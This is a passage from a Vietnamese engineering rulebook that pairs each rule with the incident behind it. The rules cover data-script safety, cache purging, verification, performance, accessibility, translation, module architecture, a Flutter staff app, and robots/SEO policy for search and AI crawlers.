  và lần nào có hai DB thì phải chạy trên CẢ HAI.

### N32 — Dữ liệu trỏ tới file mới chỉ được ghi SAU khi file đã live
- **Luật:** thứ tự không đảo được: deploy file (vô hại, chưa ai trỏ tới) → ghi DB trỏ tới file → purge cache.
- **Bài học gốc:** DB của máy dev dùng chung với production; script ghi `image_url` mới trước khi file được deploy →
  cache production hết hạn → 54/153 ảnh trả 404 trên site đang chạy. Xảy ra HAI LẦN trong cùng một ngày.
- **Dự án mới:** tách DB dev và production từ ngày đầu (mục L).

### N33 — Script dữ liệu an toàn theo mặc định
- **Luật:** chạy khô mặc định, `--apply` mới ghi · idempotent · MERGE vào cột JSON thay vì thay cả cột · DỪNG khi kết
  quả co lại so với lần trước (cờ thoát `--allow-shrink`) · thao tác phá huỷ mà đọc lỗi thì DỪNG, không coi là rỗng ·
  không đè thứ người khác đã sửa tay (cờ thoát `--force`) · một module kết nối dùng chung cho mọi script.
- **Bài học gốc (bốn lần):** (a) script seed bản dịch ghi đè nguyên cột `translations` → chạy `--force` một lần xoá
  sạch bản RU + TH, không một dòng lỗi; (b) reseed thực đơn không bê cột `translations` sang → mất bản dịch 4 ngôn ngữ
  của 131 món; (c) chạy script gắn ảnh kéo mất ảnh chủ nhà hàng vừa đổi trong admin — nhìn từ ngoài giống "sửa không
  ăn"; (d) script dọn ảnh gặp schema cache chớp một nhịp sẽ coi mọi ảnh của bảng đó là mồ côi và xoá vĩnh viễn.

### N34 — Mọi mutation purge cache của thứ nó vừa đổi, bằng purge CỨNG
- **Bài học gốc:** chế độ purge "stale-while-revalidate" trả bản CŨ thêm một lượt — admin lưu xong nhìn trang vẫn thấy
  bản cũ, tưởng chưa lưu được. Sửa DB bằng tay thì không có purge nào: ghi rõ chỗ cache local để xoá (và đúng thư mục
  — xoá nhầm thư mục cache là trang vẫn cũ và rất dễ tưởng code sai).

### N35 — Ràng buộc gói miễn phí là ràng buộc THIẾT KẾ; đo trước khi chọn cần gạt
- **Bài học gốc:** Cloudinary gói Free: đo thật ra 88% hạn mức bị ăn bởi *transformation*, không phải băng thông —
  giảm số khổ ảnh (cần gạt "trông hợp lý") là SAI cần. Supabase gói Free vượt egress → REST trả 402 cho cả tổ chức →
  app chết toàn phần dù dữ liệu còn nguyên → phải dựng DB phụ + cơ chế chuyển đổi. Một video nền 3MB không cache đốt
  egress ở mỗi lượt xem trang chủ.

### N36 — Đường lùi và nút khẩn cấp được viết ra TRƯỚC khi cần
- **Luật:** spec nào đổi dữ liệu, quyền, hoặc hạ tầng đều có mục *Rollback* cụ thể tới từng câu lệnh.
- **Bài học gốc:** rollback phân quyền phải KHOÁ tài khoản ma trận TRƯỚC khi trả code cũ (code cũ coi mọi "manager" là
  toàn quyền ⇒ nhân viên quầy thành toàn quyền ngay lập tức). Map URL ảnh được commit để trả lại URL cũ trong một
  lệnh. Công tắc `DB_MODE` ghim tay khi cơ chế tự động có vấn đề.

---

## G. Kiểm chứng

### N37 — Không có test runner vẫn phải có phép thử
- **Luật:** luật thuần (N08) + `scripts/check-<chu-de>.mjs` dùng `node:assert/strict`, chạy `node --no-warnings`,
  thoát ≠ 0 khi hỏng; mỗi ca là một câu tiếng Việt mô tả HÀNH VI ("ngày có thật: từ chối 31/02"). Lệnh chạy ghi cạnh
  mục tri thức của module, và chạy lại sau MỖI lần sửa module đó.
- **Dự án mới:** dùng `node --test` ngay từ đầu (Node 22 nạp thẳng file `.ts` chỉ dùng `import type`), giữ script
  check cho phép thử cần dữ liệu thật.

### N38 — "Y hệt bản cũ" ≠ "đúng": kiểm theo ĐẶC TÍNH mong muốn
- **Bài học gốc:** cổng so-byte dựng lúc refactor engine cắt ảnh báo xanh tuyệt đối — vì lỗi (ảnh không đúng tỉ lệ
  4:3) có từ TRƯỚC refactor. 28 ảnh trên production sai. Phép kiểm đúng là `width/height == ratio đã yêu cầu`.

### N39 — Một phép kiểm chỉ chứng minh những gì nó biết tìm
- **Luật:** phép kiểm báo 0 lỗi ngay lượt đầu trên dữ liệu thật → nghi chính phép kiểm trước khi mừng. Dòng log
  "Xong: N mục" không phải bằng chứng.
- **Bài học gốc:** kiểm bản dịch báo sạch cả 4 ngôn ngữ trong khi 37/60 bản Hàn đầy giọng quảng cáo — luật chỉ liệt kê
  từ tiếng Anh. Trong một đợt dịch, dòng "Xong" nói dối bốn lần: cắt ngang câu (model tiêu token cho suy nghĩ, hết
  token nội dung), rụng một tấm ảnh, mất 3 tiêu đề FAQ, và một bài trả nguyên tiếng Việt.

### N40 — "Xong" = đã kiểm bằng thứ thật; báo cáo tách ĐÃ KIỂM và CHƯA KIỂM
- **Luật:** build + lint + phép thử là cổng tối thiểu, không phải bằng chứng hành vi. Thay đổi hành vi → gọi API thật,
  mở trình duyệt thật, đọc lại DB. Báo cáo luôn có hai dòng: "Đã kiểm chứng: …" và "Chưa kiểm: … vì …".
- **Bài học gốc:** lỗi 404 TOÀN BỘ ảnh local (lệch một đoạn đường dẫn) bắt được nhờ `curl` thẳng vào file biến thể,
  không phải nhìn trang. Hành vi prefetch-khi-hover của Next 16 khác hẳn trí nhớ về Next 13/14 — chỉ trình duyệt thật
  cho biết.

### N41 — Phần hạ tầng có MA TRẬN KIỂM, chạy lại sau mỗi lần sửa
- **Bài học gốc:** bỏ middleware i18n, chuyển sang rewrite tĩnh → ma trận URL (trang nào 200, trang nào 308, file
  tĩnh không bị rewrite, khu nội bộ giữ nguyên URL, đường dẫn rác trả 404) ghi trong tri thức và chạy lại sau mỗi lần
  đụng vào cấu hình định tuyến.

---

## H. Hiệu năng

### N42 — Đo trước, đo sau, bằng số; A/B xen kẽ, lấy median; ghi số vào tri thức
- **Bài học gốc:** LCP mobile 6,93s → 4,79s chỉ nhờ nạp ảnh theo nhịp hiển thị; prefetch theo viewport 68 request
  (~421KB) → 2 request (~3KB); font 154KB → 75KB. Đã từng đổ lỗi oan cho một hiệu ứng CSS vì cửa sổ đo trùng đúng lúc
  một animation chạy bằng JS (không bị lệnh pause animation chặn).

### N43 — Chi phí thật thường là SỐ VÒNG MẠNG và SỐ BYTE, không phải số dòng code
- **Bài học gốc:** API admin tốn ~250ms mỗi vòng tới DB → gộp truy vấn vào một `Promise.all`; badge sidebar đếm bằng
  `count` ở header (115B) thay vì kéo cả bảng (5.5KB, 576ms) mỗi lần đổi trang. Một entry cache 3MB vượt trần 2MB →
  không bao giờ được cache → mỗi trang prerender query lại cả bảng → DB timeout → build chết.

### N44 — Chuyển động chỉ dùng `transform`/`opacity`; animation vô hạn tự dừng ngoài màn hình
- **Bài học gốc:** transition `background-color` của một khối chạy 4,2s một lần bắt trình duyệt tính lại style +
  layout CẢ TRANG mỗi khung hình; đổi sang lớp phủ chuyển `opacity`: 869 → 622ms main thread mỗi lượt. Chữ neon
  animate `text-shadow` → main thread bận 77% suốt 29s đầu; đổi sang pseudo-element chuyển `opacity` → 2%.

### N45 — Byte tải về phải khớp thứ được VẼ RA
- **Luật:** `sizes` tả đúng bề ngang ảnh được vẽ (không phải bề ngang màn hình); ảnh trang trí hoãn tới sau lần vẽ
  đầu; prefetch theo Ý ĐỊNH (hover/touch), không theo viewport; font chỉ gồm subset ngôn ngữ dùng thật.
- **Bài học gốc:** khai `100vw` cho thẻ có lề 48px → điện thoại tải bậc 828px cho khung 364px, dư 96KB mỗi thẻ.

---

## I. Giao diện & trải nghiệm

### N46 — Nội dung cho SEO nằm trong HTML tĩnh; client component chỉ giữ TRẠNG THÁI
- **Luật:** ẩn/hiện bằng thuộc tính `hidden`, không gỡ khỏi DOM; lọc bằng client, không đọc query ở server nếu việc đó
  biến trang tĩnh thành động.
- **Bài học gốc:** trang thực đơn render cả 4 tầng, tab chỉ ẩn/hiện — crawler không chạy JS thấy đủ 224 món thay vì 56.

### N47 — Tiếp cận (a11y) là luật, không phải điểm cộng
- **Luật:** tự chuyển động quá 5 giây phải có nút dừng (WCAG 2.2.2) và tự dừng khi rê chuột/focus/rời màn/tab ẩn;
  tôn trọng `prefers-reduced-motion`; focus ring nhìn thấy được; skip link nhảy QUA thanh menu; mỗi trang một `h1`;
  landmark đúng chỗ.
- **Bài học gốc:** skip link vô hình suốt nhiều tháng vì chỉ reset `clip` trong khi Tailwind v4 ẩn bằng `clip-path`;
  footer mất role `contentinfo` vì bị bọc trong `<main>`.

### N48 — Form không bao giờ làm mất thứ người dùng vừa gõ
- **Bài học gốc:** phiên hết hạn giữa chừng ở form lễ tân → không tự điều hướng (sẽ xoá sạch thông tin khách vừa đọc
  qua điện thoại) mà mở "Đăng nhập lại" ở tab mới; chặn cả click link nội bộ khi còn thay đổi chưa lưu; lỗi server
  giữ nguyên dữ liệu; trình soạn bài tự lưu nháp vào `localStorage`.

### N49 — Giá trị dẫn xuất không phải state — và phải dùng nó ở MỌI chỗ
- **Bài học gốc:** giờ hiển thị = `nearestSlot(giờ đã chọn, các khung của tầng)`; ngày = `max(ngày đã chọn, ngày khai
  trương của tầng)`. Lưu vào state thì đổi tầng làm ô chọn trỏ vào option đã biến mất và gửi lên một giờ ngoài giờ mở
  cửa. Giá trị dẫn xuất phải dùng ở cả payload, kiểm quá khứ lẫn kiểm mã ưu đãi — thiếu một chỗ là form hiện một
  ngày, gửi đi một ngày khác.

### N50 — Hai hệ thị giác: trang khách (thương hiệu) và công cụ nội bộ (dày đặc)
- **Bài học gốc:** admin bỏ bóng đổ trang trí, bo góc nhỏ, padding gọn, hover là một cú đổi nền (không dùng filter —
  thứ làm màn hình "nhấp nháy" nhất) → trang Tổng quan 2350 → 1984px với cùng dữ liệu. Đừng import component của
  trang khách vào công cụ nội bộ.

### N51 — Chỗ trên màn hình là hữu hạn: đo trước khi thêm cột/phần tử
- **Bài học gốc:** bảng booking 9 cột rộng 1240px trong khung 1132px ⇒ nút cuối phải cuộn ngang mới bấm được; trường
  mới vào modal Chi tiết thay vì thêm cột. Trên thanh header, logo là phần tử duy nhất co được ⇒ thêm nhãn dài là logo
  méo, ở 320px co về đúng 0px.

---

## J. Đa ngôn ngữ & nội dung

### N52 — Từ điển gốc là SHAPE; lưu bản dịch SPARSE; bản dịch của một chuỗi đã sửa là bản dịch sai
- **Luật:** file ngôn ngữ gốc định nghĩa kiểu, mọi ngôn ngữ khác annotate kiểu đó (thiếu key là lỗi biên dịch). CMS
  chỉ lưu field admin ĐÃ SỬA; field vắng mặt rơi về seed. Bản dịch tĩnh chỉ áp khi chuỗi gốc còn khớp seed.
- **Bài học gốc:** nếu form lưu MỌI field mỗi lần bấm Lưu, mọi field hoá "đã sửa" → bản dịch tĩnh ngừng áp dụng → một
  cú bấm đóng băng cả site về tiếng Việt.

### N53 — Ngày giờ là của ĐỊA ĐIỂM, không phải của máy người xem hay máy chủ
- **Bài học gốc:** giờ hẹn là wall-clock giờ Việt Nam không kèm offset; trừ thẳng bằng `new Date()` lệch 0 giờ trên máy
  dev ở VN và 7 giờ trên máy chủ UTC — bug ẩn rất lâu. Format theo múi giờ máy người xem → khách mở web ở New York đọc
  lệch một ngày. Luật: so CHUỖI `YYYY-MM-DD` với "hôm nay theo giờ địa điểm", cộng ngày bằng `Date.UTC`, lịch cron khai
  theo UTC (00:05 VN = `5 17 * * *`).

### N54 — Dịch máy là BẢN NHÁP có guard; sửa PROMPT trước khi vá đầu ra
- **Luật:** guard đếm số ảnh, số tiêu đề, token sót, `finishReason`, tỉ lệ trùng với bản gốc; che URL/đường dẫn trước
  khi gửi dịch (chỉ che đích, vẫn dịch nhãn); dịch từ bản đã được người soát; phân loại lỗi tạm thời (timeout, 429)
  khác lỗi cấu hình.
- **Bài học gốc:** VI→RU biến "lá quế" (húng quế) thành cinnamon, EN→RU ra đúng basil. Một timeout bị phân loại thành
  "lỗi cấu hình" → cả lô rơi sang engine kém. Một câu "keep the tone warm" trong system prompt sinh 99 chỗ giọng quảng
  cáo — ba vòng vá đầu ra trước khi có ai mở prompt ra đọc.

### N55 — Nội dung dài sống trong repo và có lint — nhưng lint có ba điểm mù
- **Luật:** bài viết là file trong repo (review bằng diff, lint bằng script), seed sang DB bằng script idempotent,
  xuất bản theo ĐỢT, đo link nội bộ trỏ tới bài chưa đăng (404) TRƯỚC mỗi đợt.
- **Ba điểm mù chỉ người đọc bắt được:** (1) hai bài giải thích cùng một CƠ CHẾ bằng chữ khác nhau; (2) từ trỏ ngược
  mồ côi ("đúng khuôn ấy") sinh ra lúc SỬA, khi đoạn chứa tiền ngữ bị gỡ; (3) câu độc quyền ("món duy nhất…") ở bài B
  thành SAI khi bài A được thêm một điều đúng — sau mỗi lần sửa, quét `duy nhất` / `chỉ có` trên TOÀN bộ bài.

### N56 — `alt` là nội dung; "upload thành công" ≠ "nội dung của tôi đã lên"
- **Luật:** ảnh không được gọi tên một món khác món bài đang nói; bí thì không có ảnh, hơn là ảnh sai. Sau khi đẩy
  media, đọc lại ĐẶC TÍNH thứ đang được phục vụ (khổ, có alpha, đúng file) — đừng tin mã 200.
- **Bài học gốc:** `x.jpg` và `x.png` cùng thư mục quy về MỘT `public_id`; file thứ hai không được ghi, kho trả về asset
  của file thứ nhất, mọi log báo thành công ⇒ hai thẻ món trên production hiện ảnh internet thay vì ảnh chụp thật.
  Người phát hiện là chủ nhà hàng, không phải phép kiểm nào.

### N62 — Bảng thuật ngữ dịch là MỘT nguồn; kiểm bằng cách đếm khối
- **Luật:** tên nhóm, nhãn, thuật ngữ lặp lại (tập đóng, vài chục chuỗi) được dịch trong ĐÚNG MỘT bảng; mọi script ghi
  chúng phải đọc từ bảng đó. Sau mỗi lượt dịch: số khối/nhóm hiển thị ở mỗi ngôn ngữ phải BẰNG bản gốc.
- **Bài học gốc:** hai script mang hai bảng dịch tên nhóm món, chọn từ tiếng Nhật khác nhau ⇒ `/ja` tách Maki/Tempura/Cơm
  chiên thành HAI khối trùng tên; một script không có tiếng Thái ⇒ `/th` hiện tên nhóm tiếng Việt cho 95/107 món.

---

## K. Làm việc với chủ dự án

### N57 — Quyết định chính sách là của chủ dự án; ghi rõ "đây là lựa chọn chính sách"
- **Bài học gốc:** "khách không đến thì nhả voucher + mã ưu đãi + credit" được ghi là LỰA CHỌN CHÍNH SÁCH kèm câu "muốn
  phạt khách bùng bàn thì sửa đúng chỗ này và ghi lý do" — để nó không thành mặc định vì quên. Email bắt buộc ở form
  khách được ghi kèm đánh đổi: khách không có email không tự đặt online được nữa.

### N58 — Mỗi tính năng kết thúc bằng "Đánh đổi đã biết" và "Còn nợ"
- **Luật:** ghi trong tri thức những gì CỐ Ý chưa làm và lý do, để người sau không tưởng là thiếu sót và cũng không
  tưởng là đã xong.

### N59 — Hành động ra bên ngoài phải hỏi trước và có lá chắn
- **Luật:** gửi thư thật, xoá dữ liệu trên kho, ghi vào DB production, đăng nội dung — hỏi chủ dự án, và có lá chắn kỹ
  thuật (địa chỉ thử `+tag`, ngày thử xa +40 ngày, dọn dữ liệu thử ngay sau đó). Phần nhận ra được bằng lệnh (`git
  push`, deploy, migration, `--apply`) có thêm hook `.claude/hooks/hoi-truoc-hanh-dong-ngoai.mjs` bật hỏi xác nhận —
  hook là lớp nhắc, không thay lá chắn hạ tầng; lệnh nó không biết (gửi thư, `psql` vào production) vẫn phải tự hỏi.
- **Bài học gốc:** thư xác nhận đặt bàn CC tới 3 hộp thư nhân viên thật → muốn gửi thử phải tạm xoá danh sách CC trước;
  DB dùng chung với production → mọi lần kiểm thật phải dùng ngày xa và dọn dòng thử.

---

## M. Kiến trúc module — rút từ IConcierge

Kiến trúc đích là **MCA 2.0** (Module + Contract + Vertical Slice + CQRS-lite + Event): bản đầy đủ ở
`docs/team/templates/KIEN-TRUC-MCA.md`. Các mục dưới là phần đã được trả giá để học, không phải phần lý thuyết.

### N63 — Ranh giới module phải được MÁY kiểm; ranh giới chỉ nằm trong quy ước thì sẽ bị xuyên
- **Luật:** mỗi luật import (cross-module chỉ qua `contract/`, `domain/` không biết framework, `platform/` không biết
  module…) có một phép kiểm chạy trong `npm run lint:arch` / `flutter test`, và phép kiểm in ra **danh sách vi phạm
  kèm đường dẫn** chứ không chỉ đỏ/xanh. Phần code chưa được máy kiểm thì ghi thẳng là "ranh giới theo quy ước".
- **Bài học gốc:** IConcierge mang ba trục chia cùng lúc (`components/<vai trò>`, `src/modules/<miền>`,
  `features/<hành động>`); chỉ `src/modules/` có dependency-cruiser canh, nên phần `components/` bị chất keo
  `services/dataService.ts` và `components/staff/types` xuyên qua mọi ranh giới (ADR 0001). App Flutter có
  `architecture_test.dart` (R1–R6) và in tên file vi phạm — một lần nó đỏ vì `features/shared` thiếu manifest, sửa
  trong năm phút vì biết đúng chỗ. Đo 03/11/2026 bằng cùng một bộ luật cho cả `src/modules/`: module `staff` (được
  canh) có 6 import chéo slice — đúng 6 ngoại lệ đã ghi tên; module `buggy` (không được canh) có 22.

### N64 — Mỗi module có manifest ghi điều code KHÔNG tự nói được; đọc trước khi sửa, sửa cùng PR
- **Luật:** `module.manifest.md` ≤ 40–50 dòng, đúng 4 mục: Mục đích · Contract surface · Invariants · Phụ thuộc.
  Invariant ghi kèm hậu quả khi vi phạm. Đổi nghĩa một symbol đang export ⇒ sửa manifest trong cùng PR.
- **Bài học gốc:** manifest `orders` của app nhân viên ghi "`getList` nhiều trạng thái PHẢI fan-out mỗi trạng thái một
  request — bỏ `?status=` rồi lọc phía client thì BE trả bảng 90 ngày mỗi 10s, quá timeout 15s trên mạng resort, lỗi
  poll bị nuốt im lặng = đơn không báo". Không đọc code nào suy ra được câu đó.

### N65 — Contract mọc lên khi có người dùng thật, không dựng sẵn; tách slice khi có người cần, không trước
- **Luật:** module chưa ai import thì không cần `contract/`; slice chưa có màn hình gọi tới thì chưa viết. Thêm
  `export` là thay đổi cộng thêm; xoá/đổi nghĩa là breaking ⇒ version mới (`…V2`) + manifest.
- **Bài học gốc:** app nhân viên chỉ 5/12 module có `contract/` — đúng những module có hàng xóm dùng. Phía web, đợt
  di trú MCA dựng sẵn 5 slice chat rồi phải XOÁ cả 5 vì một khung chat dùng chung (`ChatInboxShell`) đã thay chỗ.

### N66 — Ngoại lệ của luật kiến trúc ghi ĐÍCH DANH trong chính file luật; bất biến vận hành cũng mã hoá thành luật
- **Luật:** không tắt luật để cho qua; thêm `pathNot`/miễn trừ kèm danh sách từng ngoại lệ + vì sao, ngay trong comment
  của luật. Một bất biến chạy-thật (kênh nào KHÔNG được đi qua đâu) mà trước được "cấu trúc giữ hộ" thì khi cấu trúc
  đổi phải chuyển thành luật import.
- **Bài học gốc:** luật `call-ring-never-through-sse-pool` của IConcierge: kênh đổ chuông cuộc gọi đi qua pool SSE dùng
  chung (pool cố ý đóng kết nối khi tab ẩn) thì tab nền IM LẶNG nuốt cuộc gọi — người gọi nghe hết chuông, người nhận
  không biết. Trước ADR 0003 bất biến này đúng nhờ cấu trúc; đảo chiều kiến trúc xong thì chỉ còn luật giữ nó.

### N67 — Di trú kiến trúc bằng module SÂU (strangler fig), không bằng dời thư mục; nói thật phần chưa đạt
- **Luật:** không dời thư mục để "khớp trục" — việc đó chỉ đổi chỗ chất keo. Gỡ keo bằng cách gom một khái niệm đang
  rải rác thành MỘT module sâu (interface nhỏ, ruột lớn), chuyển chỗ gọi sang dần, xoá bản cũ khi hết người gọi.
  Manifest ghi rõ phần nào của kiến trúc đích CHƯA có (outbox, schema-per-module…) thay vì giả vờ đã có.
- **Bài học gốc:** gom "phạm vi đơn" (bộ phận → khu → outlet) thành `requestScope` — 13 chỗ gọi ở 9 file — lộ ra 5/8
  đường ghi trong một controller **lọt lớp khu**: đọc chặn nhưng ghi thì không. Tản mát thì không ai thấy; một module
  thì đọc = ghi. Manifest module staff ghi "Outbox: chưa có · Schema-per-module: chưa có" — người sau không tưởng
  event đã bền.

### N68 — Từ điển thuật ngữ + ADR: quyết định khó đảo ngược có chỗ ở, để không bị đề xuất lại
- **Luật:** `CONTEXT.md` định nghĩa mỗi khái niệm nghiệp vụ một lần (kèm từ nên TRÁNH); đặt tên module/hàm mới đúng từ
  đó. `docs/adr/NNNN-<ten>.md` cho quyết định vừa khó đảo ngược, vừa gây ngạc nhiên, vừa có đánh đổi thật. Đọc ADR
  trước khi đề xuất một hướng đã bị bác.
- **Bài học gốc:** mã `DINING` (phục vụ tại phòng) bị hiểu là "F&B nói chung" vì nhãn phòng ban ở backend ghi "Food &
  Beverage" — nhầm sang đặt bàn nhà hàng (`RESTAURANT`); `CONTEXT.md` + manifest giờ ghi rõ "là gì / không phải gì".
  Codebase mang ba trục chia cùng lúc cho tới khi ADR 0001 chốt: frontend theo vai trò · staff theo bộ phận ·
  backend theo entity + permission (chia backend theo vai trò = nhân bản logic đơn ra N bản).

---

## O. App di động — rút từ app nhân viên Flutter của IConcierge

(Bỏ qua chữ "N" để khỏi lẫn với mã `Nxx`.)

### N69 — App di động là client MỎNG của cùng một API; luật nghiệp vụ ở server
- **Luật:** không dựng backend riêng cho mobile. Luật đặt ở server thì sửa một lần, web + app cùng đúng, KHÔNG phải
  phát hành APK. Spec của mọi tính năng ghi một dòng "cần build APK mới: có/không, vì sao".
- **Bài học gốc:** "bấm Xác nhận bàn đặt = đóng đơn" đặt ở server ⇒ cả web lẫn Flutter đúng ngay, không chờ máy nhân
  viên cập nhật. Ngược lại, thu GPS kèm heartbeat cần plugin mới (`geolocator`) ⇒ phía web chạy ngay, phía app chỉ
  có tác dụng sau khi build + phát APK — tri thức phải ghi "APK chưa build" như một bước triển khai còn nợ.

### N70 — Realtime: frame SSE là TÍN HIỆU refetch, REST là sự thật, poll chậm là lưới an toàn
- **Luật:** không dựng model từ payload event (payload thường thiếu trường); nhận event ⇒ debounce ⇒ gọi lại REST ⇒ so
  với cache. Một kết nối cho mỗi URL dù bao nhiêu màn hình nghe. Poll chỉ chạy khi app ở tiền cảnh.
- **Bài học gốc:** server phát `service-request-created` với payload thiếu trường; app đưa vào `fromJson` chặt ⇒ ném
  ⇒ bị bắt ⇒ MỌI event bị bỏ, app âm thầm sống bằng poll 5s mà ai cũng tưởng realtime chạy. Một thư viện SSE bên thứ
  ba giữ một client toàn cục không bao giờ `close()` + tự retry vô hạn không huỷ được ⇒ đo được **617 kết nối cho
  7 request từ một máy** (~60% năng lực server) — phải tự viết client: một kết nối một chủ, đọc HTTP status +
  `Retry-After`.

### N71 — Build xanh ≠ chạy được trên thiết bị; tin thứ đo được trong file build, không tin cờ
- **Luật:** tính năng native (âm thanh, giọng đọc, thông báo, chạy nền) chỉ "xong" khi đã chạy trên đúng nền tảng
  (máy thật, đúng bản OS). Cờ build tuyên bố gì thì kiểm bằng cách bung sản phẩm ra mà nhìn. Nền tảng chưa từng
  build (iOS viết trên Windows) thì cần một bước CI compile-check trước khi hứa gì.
- **Bài học gốc:** "đã kiểm bằng web build" cho âm báo — build biên dịch được nhưng `audioplayers` bản web không bao
  giờ gọi tới lớp audio của trình duyệt: nhân viên không nghe gì. `ndk.abiFilters` được tin là bỏ ABI thừa — bung APK
  ra so thì byte-identical, cờ không làm gì.

### N72 — APK phát hành: MỘT khoá ký được sao lưu, đúng ABI, giữ tài nguyên tra-theo-tên
- **Luật:** tạo keystore release ngay đợt phát hành đầu, sao lưu nơi bền, mọi máy/CI dựng release dùng CÙNG khoá
  (không có trong git). Đóng gói đúng kiến trúc máy thật và loại hẳn thư mục ABI thừa. Tài nguyên Android chỉ được
  gọi bằng tên chuỗi (âm thông báo, icon nhỏ) phải khai `tools:keep`.
- **Bài học gốc:** ký bằng debug keystore của từng máy ⇒ APK dựng trên CI không cài đè được bản dựng ở máy dev ⇒ nhân
  viên phải gỡ app, mất phiên. APK universal 62 MB, 2/3 là ABI không máy nào cần; chỉ `--target-platform` thì còn
  sót `lib/armeabi-v7a/` thiếu `libflutter.so` ⇒ máy 32-bit cài được rồi crash khi mở. Resource shrinker xoá
  `ic_notification` ⇒ MỌI lệnh `notify()` ném "no valid small icon" ⇒ app crash.

### N73 — Cổng phiên bản: public, đứng TRƯỚC tường đăng nhập, fail-open; số phiên bản đọc từ gói, không gõ tay
- **Luật:** endpoint `app-version` (min · latest · link tải · ghi chú) không cần đăng nhập; app hỏi lúc khởi động, hỏi
  không được thì cho qua. Hai mức: dưới `min` ⇒ chặn cứng; dưới `latest` ⇒ nhắc nhẹ. Mỗi lần phát hành: tăng
  `version` trong manifest gói rồi cập nhật cổng — không bao giờ ngược lại.
- **Bài học gốc:** máy bị chặn chính là máy chưa đăng nhập được — đặt sau tường auth thì đúng cái app cần biết lại
  không hỏi được. Màn Tài khoản từng in chuỗi cứng `0.4.0` trong khi gói ghi `0.1.0` — đúng con số nhân viên phải đọc
  cho kỹ thuật khi báo lỗi. Cổng phân giải bất đồng bộ mà router không "nghe" nó ⇒ màn chặn gần như không bao giờ hiện.

### N74 — Chạy nền là ràng buộc của HỆ ĐIỀU HÀNH, không phải của code — và app phải nói thật giới hạn đó
- **Luật:** đọc chính sách nền của từng bản OS trước khi chọn cơ chế (kiểu foreground service, push). Trạng thái chia
  sẻ giữa hai isolate/tiến trình phải đọc lại sau `reload()`. Nền tảng không có cảnh báo nền (iOS không push) thì UI
  NÓI RA, không để người dùng tưởng đã được che. Có màn chẩn đoán trên máy (tick cuối, poll thành công cuối, quyền OS).
- **Bài học gốc:** foreground service khai `dataSync` ⇒ Android 15 cắt ở 6 giờ/24h ⇒ cảnh báo đơn lặng lẽ chết giữa
  ca; đổi sang `specialUse`. `SharedPreferences` cache theo từng isolate ⇒ isolate nền đọc giá trị cũ. Trình diệt tác
  vụ của hãng máy giết service vĩnh viễn ⇒ khởi động lại mỗi lần app trở lại tiền cảnh.

### N75 — App chạy cả ca: pin, mạng, server là yêu cầu chức năng; đăng xuất phải huỷ MỌI timer và stream
- **Luật:** mỗi timer/stream/kết nối có chủ sở hữu và có chỗ huỷ; đăng xuất `invalidate` toàn bộ provider realtime.
  Đo số kết nối đồng thời trên một máy (HTTP/1.1 chỉ 6 kết nối/tên miền).
- **Bài học gốc:** quên huỷ khi đăng xuất ⇒ poll 401 vĩnh viễn, và đăng nhập tài khoản khác trong cùng tiến trình vẫn
  nghe stream của người trước. Timer reconnect bị ghi đè mà không `cancel` ⇒ mỗi lần mạng chập số kết nối nhân đôi.
  Kết nối vượt trần 6/tên miền không báo lỗi gì — nó xếp hàng vô thời hạn, tính năng chết mà giám sát vẫn xanh.

---

## P. SEO & GEO — CHƯA qua dự án thật (1.4)

Mục này KHÁC phần còn lại của file: luật rút từ tài liệu của Google, Bing, OpenAI, Anthropic, Perplexity và
schema.org, không phải từ một lần sập. Mục "Bài học gốc" vì thế ghi **rủi ro đã biết**, không ghi sự cố. Sau dự án
đầu tiên áp các luật này, thay bằng cạm bẫy thật (MM/YYYY) hoặc bỏ luật nào hoá ra thừa (N03).
Tên bot, cơ chế index của trợ lý AI đổi nhanh: đối chiếu tài liệu nhà cung cấp lúc làm, ghi ngày đã đối chiếu.

### N76 — URL công khai là tài sản: đổi hay xoá URL phải có redirect vĩnh viễn từ ngày đổi
- **Luật:** đổi slug, dời trang, gộp bài, đổi cấu trúc ngôn ngữ ⇒ URL cũ redirect vĩnh viễn (301/308) tới URL mới
  tương đương nhất, trong CÙNG lần deploy. Slug cũ lưu lại (bảng/cột `old_slugs` hoặc file `redirects`), không xoá.
  Trang bỏ hẳn, không có trang tương đương ⇒ 410/404 thật, KHÔNG redirect hàng loạt về trang chủ (Google coi là
  soft 404). Sitemap chỉ chứa URL đích, không chứa URL redirect.
- **Bài học gốc (rủi ro đã biết):** thứ hạng, backlink, link trong thư đã gửi khách, link trong Google Business và
  câu trả lời AI đã trích đều trỏ tới URL cũ; đổi slug không redirect là xoá chúng cùng lúc, mà không lỗi build nào báo.

### N77 — Một thực thể, một bộ dữ kiện ở MỌI nơi máy đọc: site, JSON-LD, Google Business, danh bạ
- **Luật:** tên – địa chỉ – số điện thoại – giờ mở cửa (NAP + giờ) có MỘT nguồn (CMS/settings); trang, JSON-LD,
  `llms.txt` đọc nguồn đó (N07). Bản trên Google Business Profile, Bing Places, TripAdvisor, mạng xã hội khớp từng ký
  tự với nguồn — lệch thì sửa bên ngoài theo nguồn, không ngược lại. Thực thể chính có `@id` cố định + `sameAs` trỏ
  tới các hồ sơ thật đó. Giờ đặc biệt (lễ, Tết) cập nhật ở MỌI nơi cùng lúc.
- **Bài học gốc (rủi ro đã biết):** Google và trợ lý AI ghép dữ kiện từ nhiều nguồn; hai nguồn nói hai giờ mở cửa thì
  máy chọn một — thường không phải bản đúng — và khách đến lúc cửa đóng. Đây là N10 ở tầng bên ngoài repo.

### N78 — Cho bot nào đọc là quyết định CHÍNH SÁCH, tách bot huấn luyện khỏi bot tìm kiếm/trích dẫn
- **Luật:** `robots` khai từng nhóm theo quyết định của chủ dự án (N57), ghi quyết định + ngày vào `CLAUDE.md`:
  bot **tìm kiếm/trích dẫn** (Googlebot, Bingbot, OAI-SearchBot, Claude-SearchBot, PerplexityBot) — chặn là biến mất
  khỏi câu trả lời AI; bot **huấn luyện** (GPTBot, ClaudeBot, Google-Extended, Applebot-Extended, CCBot,
  Meta-ExternalAgent) — chặn hay không không đổi việc được trích. Bot do **người dùng gọi** (ChatGPT-User,
  Claude-User, Perplexity-User) có thể không theo `robots.txt`. Chặn Google-Extended KHÔNG gỡ trang khỏi AI Overviews
  (đi bằng Googlebot). Không bao giờ chặn bằng tường WAF/rate limit mà không ghi lại — đó là chặn không ai biết.
- **Bài học gốc (rủi ro đã biết):** "chặn hết bot AI cho an toàn" thường chặn luôn bot trích dẫn, và thương hiệu biến
  mất khỏi ChatGPT/Perplexity; ngược lại tường chống bot của CDN hay chặn bot tìm kiếm mà `robots.txt` vẫn mở.

### N79 — Nội dung để được TRÍCH: trả lời trước, dữ kiện cụ thể, có nguồn và ngày
